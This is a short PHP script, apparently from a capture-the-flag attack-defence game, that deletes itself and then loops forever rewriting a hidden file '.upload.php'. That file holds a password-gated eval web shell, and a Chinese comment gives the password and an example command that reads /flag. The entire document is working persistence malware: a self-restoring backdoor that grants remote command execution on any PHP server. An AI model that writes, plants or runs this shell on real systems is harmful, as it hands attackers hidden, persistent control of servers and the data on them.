<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.upload.php';  //上传文件名
$code = '<?php if(md5($_GET["ise"])=="35f00ccdb7501826fe29292ec92bfb91"){@eval($_REQUEST["cmd"]);} ?>';  //连接密码?ise=ise666&cmd=system('cat /flag');
while (1){
    file_put_contents($file,$code);
    usleep(5000);
}
?>